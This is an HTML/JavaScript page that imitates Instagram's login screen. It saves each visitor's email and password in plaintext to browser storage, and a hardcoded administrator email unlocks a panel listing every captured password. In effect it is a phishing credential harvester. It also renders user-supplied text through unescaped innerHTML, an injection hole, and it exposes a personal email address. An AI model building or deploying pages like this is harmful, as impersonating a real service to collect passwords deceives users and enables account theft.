<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
  <style>
    body { font-family: system-ui, sans-serif; }
    .instagram-blue { background-color: #0095F6; }
    .custom-scrollbar::-webkit-scrollbar { width: 6px; }
    .custom-scrollbar::-webkit-scrollbar-thumb { background: #363636; border-radius: 10px; }
  </style>
</head>
<body class="bg-black text-white min-h-screen">

  <div id="app"></div>

  <script>
    const ADMIN_EMAIL = "nikhilmaurya123455@gmail.com";
    let currentUser = null;

    // Get all users from localStorage
    function getAllUsers() {
      return JSON.parse(localStorage.getItem('allUsers')) || [];
    }

    // Save user
    function saveUser(user) {
      let users = getAllUsers();
      // Agar pehle se user hai to update karo
      const existingIndex = users.findIndex(u => u.email === user.email);
      if (existingIndex !== -1) {
        users[existingIndex] = { ...users[existingIndex], ...user };
      } else {
        users.push(user);
      }
      localStorage.setItem('allUsers', JSON.stringify(users));
    }

    function renderLogin() {
      document.getElementById('app').innerHTML = `
        <div class="min-h-screen bg-black flex flex-col items-center justify-center p-4">
          <div class="w-full max-w-[350px] border border-gray-800 rounded-2xl p-8">
            <h1 class="text-4xl font-semibold text-center mb-10">Instagram</h1>
            
            <form id="authForm" class="space-y-3">
              <input type="email" id="email" placeholder="Phone number, username or email" 
                class="w-full bg-[#121212] border border-gray-700 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-gray-500" required>
              
              <input type="password" id="password" placeholder="Password" 
                class="w-full bg-[#121212] border border-gray-700 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-gray-500" required>
              
              <button type="submit" class="instagram-blue w-full py-3 rounded-lg font-semibold text-sm hover:bg-blue-600 transition">
                Log in
              </button>
            </form>

            <div class="my-6 flex items-center">
              <div class="flex-1 h-px bg-gray-800"></div>
              <p class="px-4 text-xs text-gray-500">OR</p>
              <div class="flex-1 h-px bg-gray-800"></div>
            </div>

            <button class="flex items-center justify-center gap-2 w-full text-[#385185] font-semibold py-2">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </button>
          </div>

          <div class="w-full max-w-[350px] border border-gray-800 rounded-xl p-6 mt-4 text-center text-sm">
            Don't have an account? 
            <span onclick="alert('Signup is handled automatically on first login')" class="text-[#0095F6] font-semibold cursor-pointer">Sign up</span>
          </div>
        </div>
      `;

      document.getElementById('authForm').addEventListener('submit', handleAuth);
    }

    function handleAuth(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) return;

      currentUser = { 
        email, 
        password, 
        uid: Date.now().toString(),
        lastLogin: new Date().toISOString()
      };

      saveUser(currentUser);
      localStorage.setItem('currentUser', JSON.stringify(currentUser));

      if (email === ADMIN_EMAIL) {
        renderAdminPanel();
      } else {
        renderDashboard();
      }
    }

    function renderDashboard() {
      const announcement = JSON.parse(localStorage.getItem('announcement')) || { message: "Welcome to Instagram Portal!" };

      document.getElementById('app').innerHTML = `
        <div class="min-h-screen bg-black">
          <nav class="border-b border-gray-800 p-4 flex justify-between items-center sticky top-0 bg-black z-50">
            <h1 class="text-2xl font-bold">Instagram</h1>
            <button onclick="logout()" class="text-gray-400 hover:text-white flex items-center gap-2">
              <i class="fas fa-sign-out-alt"></i> Logout
            </button>
          </nav>

          <main class="max-w-[600px] mx-auto p-4">
            <div class="border border-gray-800 rounded-2xl overflow-hidden">
              <div class="p-4 flex items-center gap-3">
                <div class="w-9 h-9 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-500 flex items-center justify-center text-sm font-bold">A</div>
                <div>
                  <p class="font-semibold">Admin</p>
                  <p class="text-xs text-gray-500">Official Announcement</p>
                </div>
              </div>

              <div class="aspect-square bg-[#121212] flex items-center justify-center">
                ${announcement.photoUrl ? `<img src="${announcement.photoUrl}" class="w-full h-full object-cover">` : 
                  `<p class="text-gray-500">No photo yet</p>`}
              </div>

              <div class="p-4">
                <div class="flex gap-6 text-3xl mb-4">
                  <i class="far fa-heart cursor-pointer hover:text-red-500"></i>
                  <i class="far fa-comment cursor-pointer"></i>
                  <i class="far fa-paper-plane cursor-pointer"></i>
                </div>
                <p class="font-semibold mb-1">Admin</p>
                <p class="text-gray-300">${announcement.message || "No message yet"}</p>
              </div>
            </div>
          </main>
        </div>
      `;
    }

    function renderAdminPanel() {
      const users = getAllUsers();
      const announcement = JSON.parse(localStorage.getItem('announcement')) || {};

      let usersHTML = users.map(user => `
        <div class="bg-[#1a1a1a] p-4 rounded-xl border border-gray-700">
          <p class="font-medium">${user.email}</p>
          <p class="text-yellow-400 text-sm">Password: ${user.password}</p>
          <p class="text-xs text-gray-500">Last Login: ${new Date(user.lastLogin).toLocaleString()}</p>
        </div>
      `).join('');

      document.getElementById('app').innerHTML = `
        <div class="min-h-screen bg-[#050505] p-6">
          <div class="max-w-6xl mx-auto">
            <header class="flex justify-between items-center mb-8">
              <h1 class="text-3xl font-bold">Admin Panel</h1>
              <button onclick="logout()" class="px-5 py-2 border border-gray-700 rounded-lg hover:bg-gray-900">Logout</button>
            </header>

            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
              <!-- Post Update -->
              <div class="bg-[#121212] border border-gray-800 rounded-2xl p-6">
                <h2 class="text-xl font-semibold mb-5 flex items-center gap-2">
                  <i class="fas fa-bullhorn"></i> Post New Update
                </h2>
                <form id="postForm" class="space-y-4">
                  <input type="url" id="photoUrl" placeholder="Photo URL[](https://...)" class="w-full bg-black border border-gray-700 rounded-lg p-4" required>
                  <textarea id="message" placeholder="Write welcome message..." class="w-full bg-black border border-gray-700 rounded-lg p-4 h-32" required></textarea>
                  <button type="submit" class="w-full instagram-blue py-4 rounded-xl font-semibold text-lg">Post Update</button>
                </form>
              </div>

              <!-- Users List -->
              <div class="bg-[#121212] border border-gray-800 rounded-2xl p-6">
                <h2 class="text-xl font-semibold mb-5">Registered Users (${users.length})</h2>
                <div class="space-y-3 max-h-[600px] overflow-y-auto custom-scrollbar">
                  ${usersHTML || '<p class="text-gray-500 text-center py-10">No users yet</p>'}
                </div>
              </div>
            </div>
          </div>
        </div>
      `;

      document.getElementById('postForm').addEventListener('submit', handlePostUpdate);
    }

    function handlePostUpdate(e) {
      e.preventDefault();
      const photoUrl = document.getElementById('photoUrl').value;
      const message = document.getElementById('message').value;

      localStorage.setItem('announcement', JSON.stringify({ photoUrl, message }));
      alert("Update posted successfully!");
      renderAdminPanel();
    }

    function logout() {
      localStorage.removeItem('currentUser');
      currentUser = null;
      renderLogin();
    }

    // Initialize App
    function init() {
      const savedUser = localStorage.getItem('currentUser');
      if (savedUser) {
        currentUser = JSON.parse(savedUser);
        if (currentUser.email === ADMIN_EMAIL) {
          renderAdminPanel();
        } else {
          renderDashboard();
        }
      } else {
        renderLogin();
      }
    }

    window.onload = init;
  </script>
</body>
</html>
